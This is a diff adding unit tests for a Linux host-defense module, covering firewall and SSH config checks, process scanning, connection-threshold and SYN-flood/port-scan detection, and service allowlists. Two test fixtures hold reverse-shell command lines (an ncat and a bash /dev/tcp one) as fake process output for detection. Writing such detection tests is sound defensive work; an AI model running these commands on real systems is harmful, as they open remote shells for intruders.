@@ -23,7 +23,7 @@ import sys
 import json
 import tempfile
 import unittest
-from unittest.mock import patch, MagicMock
+from unittest.mock import patch, MagicMock, mock_open
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
@@ -229,6 +229,144 @@ class TestFileIntegrityBaseline(unittest.TestCase):
         # evidence of their own tampering.
         self.assertNotIn('/var/tmp', dm.MalwareDetector.BASELINE_FILE)
         self.assertTrue(dm.MalwareDetector.BASELINE_FILE.startswith('/var/lib'))
+
+
+class TestFirewallAndSshStatusChecks(unittest.TestCase):
+    """Regression tests for two confirmed substring-matching bugs: a
+    disabled firewall being reported as active (since "inactive"
+    contains "active"), and an insecure sshd_config being reported as
+    secure (since presence-of-directive-name was checked instead of its
+    actual value)."""
+
+    def test_inactive_firewall_not_reported_as_active(self):
+        sc = dm.SecurityScanner()
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout='Status: inactive\n')
+            self.assertFalse(sc.check_firewall())
+
+    def test_active_firewall_reported_as_active(self):
+        sc = dm.SecurityScanner()
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout='Status: active\n\nTo Action From\n22/tcp ALLOW Anywhere')
+            self.assertTrue(sc.check_firewall())
+
+    def test_insecure_sshd_config_not_reported_as_secure(self):
+        sc = dm.SecurityScanner()
+        insecure = 'Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes\n'
+        with patch('builtins.open', mock_open(read_data=insecure)):
+            self.assertFalse(sc.check_ssh_security())
+
+    def test_hardened_sshd_config_reported_as_secure(self):
+        sc = dm.SecurityScanner()
+        hardened = 'Port 22\nPermitRootLogin no\nPasswordAuthentication no\nPubkeyAuthentication yes\n'
+        with patch('builtins.open', mock_open(read_data=hardened)):
+            self.assertTrue(sc.check_ssh_security())
+
+
+class TestNoDuplicateProcessFindings(unittest.TestCase):
+    """A process line matching multiple suspicious keywords/patterns at
+    once (e.g. containing both "nc" and "ncat") must be reported once,
+    not once per matching pattern."""
+
+    def test_security_scanner_does_not_double_count(self):
+        sc = dm.SecurityScanner()
+        fake_ps = (
+            'USER PID COMMAND\n'
+            'attacker 1 ncat -e /bin/sh 10.0.0.1 4444\n'
+            'root 2 /usr/sbin/sshd -D\n'
+        )
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout=fake_ps)
+            result = sc.check_suspicious_processes()
+        self.assertEqual(len(result), 1)
+
+    def test_malware_detector_does_not_double_count(self):
+        md = dm.MalwareDetector()
+        fake_ps = (
+            'USER PID COMMAND\n'
+            'attacker 1 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n'
+            'root 2 /usr/sbin/sshd -D\n'
+        )
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout=fake_ps)
+            result = md.scan_executable_behavior()
+        self.assertEqual(len(result), 1, "one line matching both 'bash -i' and '/dev/tcp' must count once")
+
+
+class TestSuspiciousIpDetection(unittest.TestCase):
+    """Per-source connection-count threshold logic for NetworkMonitor."""
+
+    def test_flags_high_connection_count_not_normal_traffic(self):
+        nm = dm.NetworkMonitor()
+        lines = ['Netid State Local-Address:Port Peer-Address:Port']
+        for i in range(25):
+            lines.append(f'tcp ESTAB 192.168.1.5:80 203.0.113.99:{50000+i}')
+        for i in range(3):
+            lines.append(f'tcp ESTAB 192.168.1.5:443 198.51.100.5:{60000+i}')
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout='\n'.join(lines))
+            suspicious = nm.detect_suspicious_ips()
+        self.assertIn('203.0.113.99', suspicious)
+        self.assertNotIn('198.51.100.5', suspicious)
+
+
+class TestIdsPerSourceDetection(unittest.TestCase):
+    """SYN flood and port-scan detection must be scoped per source IP,
+    and a normal client must not trigger either."""
+
+    def test_syn_flood_port_scan_and_normal_traffic_all_classified_correctly(self):
+        ids = dm.IntrusionDetectionSystem()
+        lines = ['State Recv-Q Send-Q Local-Address:Port Peer-Address:Port']
+        for i in range(35):
+            lines.append(f'SYN-RECV 0 0 192.168.1.5:80 203.0.113.50:{40000+i}')
+        for port in range(20):
+            lines.append(f'ESTAB 0 0 192.168.1.5:{9000+port} 198.51.100.77:55555')
+        for i in range(5):
+            lines.append(f'ESTAB 0 0 192.168.1.5:443 172.16.0.9:{33000+i}')
+
+        def fake_run(cmd, **kwargs):
+            r = MagicMock()
+            r.returncode = 0
+            r.stdout = '\n'.join(lines) if cmd[0] == 'ss' else ''
+            return r
+
+        with patch('defense_modules.subprocess.run', side_effect=fake_run):
+            threats = ids.analyze_network_behavior()
+
+        self.assertTrue(any('203.0.113.50' in t and 'SYN flood' in t for t in threats))
+        self.assertTrue(any('198.51.100.77' in t and 'port scan' in t for t in threats))
+        self.assertFalse(any('172.16.0.9' in t for t in threats))
+        # The SYN-flood source only touched one port, so it must not
+        # ALSO be reported as a port scanner.
+        self.assertFalse(any('203.0.113.50' in t and 'port scan' in t for t in threats))
+
+
+class TestExpectedServicesAllowlist(unittest.TestCase):
+    """check_running_services: populated allowlist flags outliers; empty
+    allowlist flags nothing (avoids false positives with no baseline)."""
+
+    def _fake_services_output(self):
+        return (
+            'sshd.service loaded active running OpenSSH server\n'
+            'cron.service loaded active running cron daemon\n'
+            'suspicious-xyz.service loaded active running Unknown\n'
+        )
+
+    def test_populated_allowlist_flags_outlier_only(self):
+        sc = dm.SecurityScanner()
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout=self._fake_services_output())
+            with patch('defense_modules._cfg', side_effect=lambda k, d: ['sshd', 'cron'] if k == 'EXPECTED_SERVICES' else d):
+                unexpected = sc.check_running_services()
+        self.assertEqual(unexpected, ['suspicious-xyz'])
+
+    def test_empty_allowlist_flags_nothing(self):
+        sc = dm.SecurityScanner()
+        with patch('defense_modules.subprocess.run') as mock_run:
+            mock_run.return_value = MagicMock(stdout=self._fake_services_output())
+            with patch('defense_modules._cfg', side_effect=lambda k, d: [] if k == 'EXPECTED_SERVICES' else d):
+                unexpected = sc.check_running_services()
+        self.assertEqual(unexpected, [])
 
 
 class TestConfigValidation(unittest.TestCase):
